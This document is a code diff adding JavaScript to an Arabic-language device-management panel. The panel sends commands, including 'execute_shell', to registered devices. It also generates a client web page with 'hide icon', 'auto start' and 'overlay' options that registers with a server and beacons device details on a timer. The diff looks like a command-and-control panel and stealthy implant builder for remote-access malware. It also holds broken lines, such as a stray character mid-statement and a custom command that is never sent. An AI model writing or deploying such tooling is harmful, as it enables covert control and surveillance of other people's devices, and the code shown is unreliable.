@@ -554,4 +554,257 @@
                     }
                 });
 
-            document.que
+                       document.querySelectorAll('.device-card').forEach(card => card.classList.remove('active'));
+            renderDevices([]);
+            refreshDevices();
+        }
+
+        async function sendCommand(type) {
+            if (!selectedDeviceId) {
+                showToast('يرجى اختيار جهاز أولاً', 'error');
+                return;
+            }
+            try {
+                const response = await fetch(SERVER_URL + '/api/devices/' + selectedDeviceId + '/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type: type, payload: {} })
+                });
+                const data = await response.json();
+                if (data.success) {
+                    showToast('✅ تم إرسال الأمر بنجاح');
+    p             document.getElementById('commandResult').style.display = 'block';
+                    document.getElementById('commandResult').textContent =
+                        'تم إرسال الأمر: ' + type + '\nمعرف الأمر: ' + data.command?.id;
+                } else {
+                    showToast('فشل: ' + data.error, 'error');
+                }
+            } catch (error) {
+                showToast('خطأ في الاتصال', 'error');
+            }
+        }
+
+        async function sendCustomCommand() {
+            const command = document.getElementById('customCommand').value;
+            if (!command) {
+                showToast('يرجى إدخال أمر', 'error');
+                return;
+            }
+            await sendCommand('execute_shell');
+        }
+
+        function generateConfig() {
+            const serverUrl = document.getElementById('configServerUrl').value;
+            const appName = document.getElementById('configAppName').value;
+            const appId = document.getElementById('configAppId').value;
+            const interval = parseInt(document.getElementById('configInterval').value) * 1000;
+            const hideIcon = document.getElementById('configHideIcon').checked;
+            const autoStart = document.getElementById('configAutoStart').checked;
+            const overlay = document.getElementById('configOverlay').checked;
+
+            if (!serverUrl) {
+                showToast('يرجى إدخال رابط الخادم', 'error');
+                return;
+            }
+
+            const config = {
+                server: {
+                    url: serverUrl,
+                    checkInInterval: interval
+                },
+                app: {
+                    name: appName,
+                    version: '1.0.0',
+                    id: appId
+                },
+                features: {
+                    hideIcon: hideIcon,
+                    autoStart: autoStart,
+                    overlay: overlay
+                },
+                configId: 'config_' + Date.now()
+            };
+
+            const configScript = `<script id="app-config" type="application/json">
+${JSON.stringify(config, null, 2)}
+<\/script>`;
+
+            const fullHtml = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>${appName}</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container { text-align: center; color: #fff; padding: 20px; }
+        .status-bar {
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+        .status-bar.online { background: rgba(34, 197, 94, 0.8); }
+        .status-bar.offline { background: rgba(239, 68, 68, 0.8); }
+        .status-bar.connecting { background: rgba(251, 191, 36, 0.8); }
+        .card {
+            background: rgba(255,255,255,0.2);
+            border-radius: 20px;
+            padding: 30px;
+            backdrop-filter: blur(10px);
+        }
+        .info { margin: 10px 0; font-size: 0.9rem; opacity: 0.9; }
+    </style>
+</head>
+<body>
+    ${configScript}
+    <div class="container">
+        <div id="statusBar" class="status-bar connecting">جاري الاتصال...</div>
+        <div class="card">
+            <h2>${appName}</h2>
+            <p class="info" id="statusText">يرجى الانتظار</p>
+            <p class="info">البطارية: <span id="batteryLevel">--</span></p>
+            <p class="info">الشبكة: <span id="networkType">--</span></p>
+        </div>
+    </div>
+    <script>
+        (function() {
+            let config = JSON.parse(document.getElementById('app-config').textContent);
+            let deviceId = localStorage.getItem('deviceTracker_id');
+            let encryptionKey = localStorage.getItem('deviceTracker_key');
+            let retryCount = 0;
+            const MAX_RETRIES = 5;
+
+            function updateStatus(status, text) {
+                document.getElementById('statusBar').className = 'status-bar ' + status;
+                document.getElementById('statusText').textContent = text;
+            }
+
+            async function register() {
+                try {
+                    const res = await fetch(config.server.url + '/api/clients/register', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            clientId: 'device_' + Date.now(),
+                            deviceInfo: {
+                                platform: navigator.platform,
+                                userAgent: navigator.userAgent,
+                                screen: screen.width + 'x' + screen.height
+                            }
+                        })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        deviceId = data.deviceId;
+                        encryptionKey = data.encryptionKey;
+                        localStorage.setItem('deviceTracker_id', deviceId);
+                        localStorage.setItem('deviceTracker_key', encryptionKey);
+                        return true;
+                    }
+                } catch(e) { console.error(e); }
+                return false;
+            }
+
+            async function checkIn() {
+                try {
+                    if (!deviceId) await register();
+                    const res = await fetch(config.server.url + '/api/clients/checkin', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ deviceId: deviceId, encryptedData: null })
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        updateStatus('online', 'متصل');
+                        retryCount = 0;
+                        return true;
+                    }
+                } catch(e) {
+                    retryCount++;
+                    if (retryCount >= MAX_RETRIES) {
+                        updateStatus('offline', 'غير متصل');
+                    } else {
+                        updateStatus('connecting', 'إعادة المحاولة...');
+                    }
+                }
+                return false;
+            }
+
+            function updateDeviceInfo() {
+                if (navigator.getBattery) {
+                    navigator.getBattery().then(b => {
+                        document.getElementById('batteryLevel').textContent = Math.round(b.level * 100) + '%';
+                    });
+                }
+                if (navigator.connection) {
+                    document.getElementById('networkType').textContent = navigator.connection.effectiveType || 'unknown';
+                }
+            }
+
+            async function init() {
+                await checkIn();
+                updateDeviceInfo();
+                setInterval(checkIn, config.server.checkInInterval);
+            }
+
+            init();
+        })();
+    <\/script>
+</body>
+</html>`;
+
+            document.getElementById('configOutput').textContent = fullHtml;
+            document.getElementById('configResult').style.display = 'block';
+            showToast('تم إنشاء التكوين بنجاح');
+        }
+
+        function copyConfig() {
+            const config = document.getElementById('configOutput').textContent;
+            navigator.clipboard.writeText(config).then(() => {
+                showToast('تم النسخ!');
+            });
+        }
+
+        function saveSettings() {
+            const url = document.getElementById('serverUrl').value;
+            if (url) {
+                localStorage.setItem('SERVER_URL', url);
+                SERVER_URL = url;
+                showToast('تم حفظ الإعدادات');
+            }
+        }
+
+        async function testConnection() {
+            const statusEl = document.getElementById('connectionStatus');
+            statusEl.textContent = 'جاري الاختبار...';
+            statusEl.style.color = '#fbbf24';
+            try {
+                const response = await fetch(SERVER_URL + '/', { timeout: 5000 });
+                const data = await response.json();
+                if (data.success) {
+                    statusEl.textContent = '✅ الخادم يعمل!';
+                    statusEl.style.color = '#22c55e';
+                } else {
+                    statusEl.textContent = '⚠️ استجابة غير متوقعة';
+                    statusEl.style.color = '#fbbf24';
+                }
+            } catch (error) {
+                statusEl.textContent = '❌ فشل الاتصال: ' + error.message;
+                statusEl.style.color = '#ef4444';
+            }
+        }
+
+        refreshDevices();
+        setInterval(refreshDevices, 30000);
+    </script>
+</body>
+</html>
